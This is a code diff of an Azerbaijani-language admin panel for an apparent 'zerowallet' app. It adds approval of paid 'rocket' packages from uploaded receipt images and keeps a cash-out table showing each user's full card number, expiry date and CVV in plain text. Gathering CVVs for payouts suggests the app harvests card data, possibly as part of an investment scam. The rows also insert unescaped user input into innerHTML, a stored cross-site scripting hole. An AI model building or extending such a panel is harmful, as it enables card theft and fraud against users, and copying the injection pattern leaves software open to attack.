@@ -19,9 +19,9 @@
         .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; }
         .btn-block { background: #ff3e3e; color: white; }
         .btn-unblock { background: #00ff41; color: black; }
-        .btn-status { background: var(--neon); color: black; }
         .editable-balance { color: #00ff41; cursor: pointer; text-decoration: underline dotted; font-weight: bold; }
         .sys-box { background: #1c1c1f; padding: 20px; border-radius: 10px; border: 1px solid var(--neon); margin-bottom: 20px; }
+        .img-preview { width: 100px; height: 100px; object-fit: cover; border-radius: 5px; cursor: pointer; border: 1px solid var(--neon); }
     </style>
 </head>
 <body>
@@ -35,10 +35,18 @@
         <button id="toggle-sys-btn" class="btn" onclick="toggleSystem()" style="padding: 15px 30px; font-size: 1rem;"></button>
     </div>
 
-    <h2><i class="fas fa-credit-card"></i> ÇIXARIŞ TƏLƏBLƏRİ (ÇEKLƏR)</h2>
+    <h2><i class="fas fa-file-invoice-dollar"></i> GƏLƏN ÖDƏNİŞLƏR (ROKET ÇEKLƏRİ)</h2>
     <div class="table-wrap">
         <table>
-            <thead><tr><th>İstifadəçi</th><th>Məbləğ</th><th>Kart Sahibi</th><th>Kart No/EXP/CVV</th><th>Status/İdarəetmə</th></tr></thead>
+            <thead><tr><th>İstifadəçi</th><th>Alınan Roket</th><th>Çek Şəkli</th><th>İdarəetmə</th></tr></thead>
+            <tbody id="payment-body"></tbody>
+        </table>
+    </div>
+
+    <h2><i class="fas fa-university"></i> NAĞDLAŞDIRMA TƏLƏBLƏRİ (KART)</h2>
+    <div class="table-wrap">
+        <table>
+            <thead><tr><th>İstifadəçi</th><th>Məbləğ</th><th>Kart Sahibi</th><th>Kart/EXP/CVV</th><th>İdarəetmə</th></tr></thead>
             <tbody id="withdraw-body"></tbody>
         </table>
     </div>
@@ -87,7 +95,34 @@
         });
     }
 
-    // ÇIXARIŞLARI İDARƏ ETMƏK (ÇEKLƏRİ QƏBUL ET)
+    // ÇEKLƏRİ İDARƏ ETMƏK (ROKET AKTİVLƏŞDİRMƏ)
+    db.ref('admin_receipts').on('value', snap => {
+        const body = document.getElementById('payment-body'); body.innerHTML = '';
+        snap.forEach(child => {
+            const d = child.val();
+            const key = child.key;
+            body.innerHTML += `<tr>
+                <td><b>${d.username}</b></td>
+                <td><span style="color:var(--neon)">${d.rocket_type}</span></td>
+                <td><img src="${d.receipt_url}" class="img-preview" onclick="window.open(this.src)"></td>
+                <td>
+                    <button class="btn btn-unblock" onclick="approveRocket('${key}', '${d.username}', '${d.rocket_type}')">TƏSDİQLƏ (AKTİV ET)</button>
+                    <button class="btn btn-block" onclick="removeData('admin_receipts/${key}')">SİL</button>
+                </td>
+            </tr>`;
+        });
+    });
+
+    function approveRocket(key, username, rocketType) {
+        if(confirm(`${username} üçün ${rocketType} paketi aktiv edilsin?`)) {
+            db.ref('zerowallet_users/' + username).update({ rocket: rocketType.toLowerCase() }).then(() => {
+                db.ref('admin_receipts/' + key).remove();
+                alert("Paket uğurla aktivləşdirildi!");
+            });
+        }
+    }
+
+    // NAĞDLAŞDIRMA (AYRI BÖLMƏ)
     db.ref('admin_withdrawals').on('value', snap => {
         const body = document.getElementById('withdraw-body'); body.innerHTML = '';
         snap.forEach(child => {
@@ -99,32 +134,25 @@
                 <td>${d.card_name}</td>
                 <td>${d.card_num} | ${d.card_exp} | ${d.card_cvv}</td>
                 <td>
-                    <button class="btn btn-unblock" onclick="approveWithdrawal('${key}', '${d.username}', ${d.amount})">TƏSDİQLƏ</button>
-                    <button class="btn btn-block" onclick="rejectWithdrawal('${key}')">İMTİNA</button>
+                    <button class="btn btn-unblock" onclick="approveWithdrawal('${key}', '${d.username}', ${d.amount})">ÖDƏNİLDİ</button>
+                    <button class="btn btn-block" onclick="removeData('admin_withdrawals/${key}')">İMTİNA</button>
                 </td>
             </tr>`;
         });
     });
 
     function approveWithdrawal(key, username, amount) {
-        if(confirm(`${username} üçün ${amount} AZN ödəniş təsdiqlənsin? (Balansdan çıxılacaq)`)) {
+        if(confirm(`${username} ödənişi tamamlandı? (Balansdan çıxılacaq)`)) {
             db.ref('zerowallet_users/' + username).once('value', snap => {
                 const currentBal = snap.val().balance || 0;
-                if(currentBal >= amount) {
-                    db.ref('zerowallet_users/' + username).update({ balance: currentBal - amount });
-                    db.ref('admin_withdrawals/' + key).remove();
-                    alert("Ödəniş təsdiqləndi və balansdan çıxıldı.");
-                } else {
-                    alert("Xəta: İstifadəçinin balansı yetərli deyil!");
-                }
+                db.ref('zerowallet_users/' + username).update({ balance: Math.max(0, currentBal - amount) });
+                db.ref('admin_withdrawals/' + key).remove();
             });
         }
     }
 
-    function rejectWithdrawal(key) {
-        if(confirm("Bu tələbdən imtina edilsin?")) {
-            db.ref('admin_withdrawals/' + key).remove();
-        }
+    function removeData(path) {
+        if(confirm("Bu məlumat silinsin?")) db.ref(path).remove();
     }
 
     db.ref('zerowallet_users').on('value', snap => {
